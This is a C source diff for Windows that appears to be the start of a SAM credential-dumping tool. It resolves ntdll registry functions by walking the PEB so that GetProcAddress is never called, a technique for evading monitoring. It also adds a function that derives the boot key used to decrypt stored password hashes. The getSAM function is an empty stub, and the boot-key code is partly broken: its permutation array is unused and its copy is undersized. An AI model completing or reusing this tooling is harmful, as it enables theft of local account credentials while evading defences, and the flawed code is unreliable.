@@ -13,6 +13,16 @@
 
 #include "Main.h"
 
+// Globals "myFuncs"
+myMessageBox pMyMessageBox;
+myNtOpenKey pMyNtOpenKey;
+myNtQueryKey pMyNtQueryKey;
+myNtEnumerateKey pMyNtEnumerateKey;
+myNtQueryValueKey pMyNtQueryValueKey;
+myNtEnumerateValueKey pMyNtEnumerateValueKey;
+
+
+// Get Address from Export in module by walking PEB. Thus, not calling GetModuleHandle + GetProcAddress.
 FARPROC myGetProcAddress(PCHAR moduleName, PCHAR exportName) {
 	PCHAR moduleMayus = (PCHAR)HeapAlloc(GetProcessHeap(), 0, strlen(moduleName) + 1);
 	strncpy_s(moduleMayus, strlen(moduleName) + 1, moduleName, _TRUNCATE);
@@ -66,11 +76,43 @@ FARPROC myGetProcAddress(PCHAR moduleName, PCHAR exportName) {
 	return found;
 }
 
+/*
+* NtOpenKey -> RegOpenKey, RegOpenKeyEx
+* NtQueryKey -> RegQueryInfoKey
+* NtEnumerateKey -> RegEnumerateKey, RegEnumerateKeyEx, RegEnumKey, RegEnumKeyEx
+* NtQueryValueKey -> RegQueryValue, RegQueryValueEx
+* NtEnumerateValueKey -> RegEnumValue
+* 
+*/
+void getSAM(PSAM* samRegEntries) {
+
+}
+
+void getBootKey(PSAM samRegEntry, int* bootKeyRet) {
+	unsigned int magics[16] = { 8,5,4,2,11,9,13,3,0,6,1,12,14,10,15,7 };
+	unsigned int bootKey[16];
+	for (int i = 0; i < 16; i++) {
+		PCHAR auxStr = (PCHAR)HeapAlloc(GetProcessHeap(), 0, 3);
+		auxStr[0] = samRegEntry->classes[i * 2];
+		auxStr[1] = samRegEntry->classes[(i * 2) + 1];
+		auxStr[2] = '\0';
+
+		bootKey[i] = strtol(auxStr, NULL, 16);
+	}
+	memcpy(bootKeyRet, bootKey, 16);
+}
+
 int main(int argc, char** argv) {
-	typedef FARPROC(WINAPI* myMessageBox)(HWND, LPCTSTR, LPCTSTR, UINT);
-	myMessageBox pMyMessageBox = (myMessageBox)myGetProcAddress((PCHAR)"user32.dll", (PCHAR)"MessageBoxA");
+	pMyMessageBox = (myMessageBox)myGetProcAddress((PCHAR)"user32.dll", (PCHAR)"MessageBoxA");
+	pMyNtOpenKey = (myNtOpenKey)myGetProcAddress((PCHAR)"ntdll.dll", (PCHAR)"NtOpenKey");
+	pMyNtQueryKey = (myNtQueryKey)myGetProcAddress((PCHAR)"ntdll.dll", (PCHAR)"NtQueryKey");
+	pMyNtEnumerateKey = (myNtEnumerateKey)myGetProcAddress((PCHAR)"ntdll.dll", (PCHAR)"NtEnumerateKey");
+	pMyNtQueryValueKey = (myNtQueryValueKey)myGetProcAddress((PCHAR)"ntdll.dll", (PCHAR)"NtQueryValueKey");
+	pMyNtEnumerateValueKey = (myNtEnumerateValueKey)myGetProcAddress((PCHAR)"ntdll.dll", (PCHAR)"NtEnumerateValueKey");
 
 	if (pMyMessageBox != NULL) {
 		pMyMessageBox(NULL, (LPCTSTR)"TEST", (LPCTSTR)"TEST", MB_OK);
 	}
+
+
 }
